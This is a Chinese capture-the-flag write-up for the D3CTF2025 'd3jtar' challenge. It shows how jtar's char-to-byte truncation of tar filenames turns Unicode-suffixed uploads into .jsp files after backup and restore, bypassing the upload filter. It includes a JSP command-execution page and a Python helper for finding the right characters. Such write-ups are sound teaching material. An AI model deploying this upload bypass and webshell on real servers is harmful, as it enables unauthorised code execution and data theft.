# d3jtar

## 题目简述

题目附件及环境镜像位于 `https://github.com/5i1encee/D3CTF2025-d3jtar`。仓库的关键信息是：网站有备份/恢复功能，后端使用 jtar 打包用户上传文件；同时 view 路由存在 JSP 解析能力。题目表面上是文件上传后缀过滤，真正的突破点是 jtar 对文件名编码的处理会改变归档后的文件名。

本题网站文件备份系统的view 路由下配置了不安全的jsp 解析，显然只要成功上传jsp文件即可RCE。然而后端对上传文件的名称做了较为严格的校验，理想情况下选手无法通过其他手段绕过secureUpload 校验来上传jsp 文件。那么结合本题标题可知，解题的关键在于工具类Backup 所使用的jtar 打包库。在使用jtar 的TarOutputStream 打包文件时，它会把文件名中的unicode 强制转化为ascii 码，从而发生字符截断。利用这一点，我们可以将后缀带有特定unicode 字符的文件上传至靶机，绕过后缀黑名单检查，通过备份与恢复功能将上传的文件转变为jsp 后缀的文件并放回jsp 可解析目录，最终RCE 获取flag。示例文件如下：文件名：payload.陪sp --> payload.jsp

## 解题过程

```java
<%@ page import="java.io.*" %>
<%
    String cmd = "printenv";
    String output = "";
    try {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            output += line + "<br>";
        }
    } catch (Exception e) {
        output = "命令执行错误: " + e.getMessage();
    }
%>
<html>
<head><title>命令输出</title></head>
<body>
<h2>已执行命令: <code><%= cmd %></code></h2>
<pre><%= output %></pre>
</body>
</html>
```

具体原理来自 jtar 源码 `https://github.com/kamranzafar/jtar` 中 `TarHeader.getNameBytes` 的实现：它在写入 tar 头时把 Java `char` 强制转换为 `byte`，高字节被截断，只保留低 8 位。因此 Unicode 文件名在打包后可能变成另一个 ASCII 文件名。对本题而言，只要选择低字节分别等于 `j`、`s`、`p` 的 Unicode 字符，就能让上传时看似不是 `.jsp` 的文件，在备份恢复后变成 `.jsp`。

关键代码如下，问题点就是 `(byte) name.charAt(i)` 只保留低 8 位：

```java
public static int getNameBytes(StringBuffer name, byte[] buf, int offset, int length) {
    int i;

    for (i = 0; i < length && i < name.length(); ++i) {
        buf[offset + i] = (byte) name.charAt(i);
    }

    for (; i < length; ++i) {
        buf[offset + i] = 0;
    }

    return offset + length;
}
```

解题所使用的unicode 字符可以参考以下脚本获取，只要可以转换为正常后缀的ASCII 字符即可，例如payload.멪ⅳば也是相同效果。

```python
import unicodedata
def reverse_search(byte_value):
    low_byte = byte_value & 0xFF
    candidates = []
    for high in range(0x00, 0xFF + 1):
        code_point = (high << 8) | low_byte
        try:
            char = chr(code_point)
            name = unicodedata.name(char)
            candidates.append((f"U+{code_point:04X}", char, name))
        except ValueError:
            continue
    return candidates
ascii_character = "j"  # "s","p"
byte_val = ord(ascii_character)
print(f"可能的原始字符 ({byte_val} → 0x{byte_val & 0xFF:02X}）:")
results = reverse_search(byte_val)
for cp, char, name in results:
    print(f"{cp}: {char} - {name}")
```

另外，其实选手如果有心注意的话，在 jtar 的 GitHub 项目里有一条 2023 年的 PR（最上方），是关于中文编码错误的修改（但并未被合并），可以作为一条潜在提示，提醒选手关注 jtar 的编码问题。

## 方法总结

- 核心技巧：利用 jtar 写 tar 头时的 Unicode 到 byte 截断，让服务端校验看到的文件名和恢复后的文件名不一致。
- 识别信号：文件上传过滤严格但存在备份/恢复/压缩归档链路时，应检查归档库是否会重编码、截断或规范化文件名。
- 复用要点：payload 文件名不必固定为 `payload.陪sp`，只要后缀字符的低 8 位能截断成 `jsp` 即可；恢复目录又能被 JSP 解析时即可形成 RCE。
